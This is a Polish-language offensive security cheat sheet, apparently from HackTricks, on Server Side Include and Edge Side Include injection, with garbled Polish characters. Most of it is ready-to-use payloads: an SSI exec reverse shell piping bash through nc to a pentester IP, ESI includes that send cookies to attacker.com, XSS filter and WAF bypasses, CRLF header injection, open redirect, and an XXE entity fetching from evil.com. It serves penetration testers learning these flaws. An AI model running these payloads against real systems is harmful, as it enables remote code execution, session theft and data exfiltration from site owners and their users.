# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Basic Information

**(Wprowadzenie zaczerpnite z [dokumentacji Apache](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) to dyrektywy, kt贸re s **umieszczane w stronach HTML i oceniane na serwerze** podczas serwowania stron. Pozwalaj one na **dodawanie dynamicznie generowanej treci** do istniejcej strony HTML, bez koniecznoci serwowania caej strony za pomoc programu CGI lub innej technologii dynamicznej.\
Na przykad, mo偶esz umieci dyrektyw w istniejcej stronie HTML, tak jak:

`<!--#echo var="DATE_LOCAL" -->`

A gdy strona jest serwowana, ten fragment zostanie oceniony i zastpiony swoj wartoci:

`Wtorek, 15-Sty-2013 19:28:54 EST`

Decyzja o tym, kiedy u偶ywa SSI, a kiedy mie stron cakowicie generowan przez jaki program, zazwyczaj zale偶y od tego, ile strony jest statyczne, a ile musi by przeliczane za ka偶dym razem, gdy strona jest serwowana. SSI to wietny spos贸b na dodanie maych fragment贸w informacji, takich jak aktualny czas - pokazany powy偶ej. Ale jeli wikszo twojej strony jest generowana w momencie, gdy jest serwowana, musisz poszuka innego rozwizania.

Mo偶esz wnioskowa o obecnoci SSI, jeli aplikacja webowa u偶ywa plik贸w z rozszerzeniami **`.shtml`, `.shtm` lub `.stm`**, ale to nie jest jedyny przypadek.

Typowa ekspresja SSI ma nastpujcy format:
```
<!--#directive param="value" -->
```
### Sprawd藕
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

Istnieje problem **z buforowaniem informacji lub dynamicznych aplikacji**, poniewa偶 cz treci mo偶e by **r贸偶na** przy nastpnym pobraniu treci. To jest to, do czego su偶y **ESI**, aby wskaza za pomoc tag贸w ESI **dynamiczn tre, kt贸ra musi by generowana** przed wysaniem wersji z pamici podrcznej.\
jeli **atakujcy** jest w stanie **wstrzykn tag ESI** wewntrz treci z pamici podrcznej, to m贸gby by w stanie **wstrzykn dowoln tre** do dokumentu przed jego wysaniem do u偶ytkownik贸w.

### ESI Detection

Nastpujcy **nag贸wek** w odpowiedzi z serwera oznacza, 偶e serwer u偶ywa ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Jeli nie mo偶esz znale藕 tego nag贸wka, serwer **mo偶e mimo wszystko u偶ywa ESI**.\
**Mo偶na r贸wnie偶 zastosowa podejcie lepej eksploitacji**, poniewa偶 偶danie powinno dotrze do serwera atakujcego:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### Wykorzystanie ESI

[GoSecure stworzy](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) tabel, aby zrozumie mo偶liwe ataki, kt贸re mo偶emy przeprowadzi przeciwko r贸偶nemu oprogramowaniu obsugujcemu ESI, w zale偶noci od wspieranej funkcjonalnoci:

* **Includes**: Obsuguje dyrektyw `<esi:includes>`
* **Vars**: Obsuguje dyrektyw `<esi:vars>`. Przydatne do omijania filtr贸w XSS
* **Cookie**: Ciasteczka dokumentu s dostpne dla silnika ESI
* **Wymagane nag贸wki upstream**: Aplikacje zastpcze nie przetworz instrukcji ESI, chyba 偶e aplikacja upstream dostarczy nag贸wki
* **Lista dozwolonych host贸w**: W tym przypadku wczenia ESI s mo偶liwe tylko z dozwolonych host贸w serwera, co sprawia, 偶e SSRF, na przykad, jest mo偶liwe tylko przeciwko tym hostom

|         **Oprogramowanie**         | **Includes** | **Vars** | **Ciasteczka** | **Wymagane nag贸wki upstream** | **Lista dozwolonych host贸w** |
| :---------------------------------: | :----------: | :------: | :------------: | :-----------------------------: | :--------------------------: |
|              Squid3                |      Tak     |    Tak   |      Tak      |              Tak                |            Nie              |
|           Varnish Cache            |      Tak     |    Nie   |      Nie      |              Tak                |            Tak              |
|              Fastly                |      Tak     |    Nie   |      Nie      |              Nie                |            Tak              |
| Akamai ESI Test Server (ETS)       |      Tak     |    Tak   |      Tak      |              Nie                |            Nie              |
|            NodeJS esi              |      Tak     |    Tak   |      Tak      |              Nie                |            Nie              |
|           NodeJS nodesi            |      Tak     |    Nie   |      Nie      |              Nie                |          Opcjonalnie        |

#### XSS

Poni偶sza dyrektywa ESI zaadowuje dowolny plik wewntrz odpowiedzi serwera
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Ominicie ochrony XSS po stronie klienta
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Kradzie偶 ciasteczka

* Zdalna kradzie偶 ciasteczka
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Kradnij cookie HTTP\_ONLY za pomoc XSS, odzwierciedlajc je w odpowiedzi:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Prywatny lokalny plik

Nie myl tego z "Lokalnym wczeniem pliku":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

Poni偶sze doda nag贸wek `Location` do odpowiedzi
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Dodaj nag贸wek

* Dodaj nag贸wek w wymuszonej probie
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Dodaj nag贸wek w odpowiedzi (przydatne do obejcia "Content-Type: text/json" w odpowiedzi z XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF w nag贸wku Add (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

To wyle informacje debugowe zawarte w odpowiedzi:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Poprzez okrelenie wartoci `xslt` dla parametru _dca_, mo偶liwe jest doczenie **`eXtensible Stylesheet Language Transformations (XSLT)`** opartego na ESI. Doczenie powoduje, 偶e HTTP surrogate pobiera pliki XML i XSLT, przy czym ten ostatni filtruje pierwszy. Takie pliki XML s podatne na ataki _XML External Entity (XXE)_, umo偶liwiajc atakujcym przeprowadzenie atak贸w SSRF. Jednak u偶yteczno tego podejcia jest ograniczona, poniewa偶 ESI ju偶 dziaa jako wektor SSRF. Z powodu braku wsparcia w podstawowej bibliotece Xalan, zewntrzne DTD nie s przetwarzane, co uniemo偶liwia ekstrakcj lokalnych plik贸w.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
Plik XSLT:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Check the XSLT page:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Odniesienia

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Lista wykrywania brute-force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
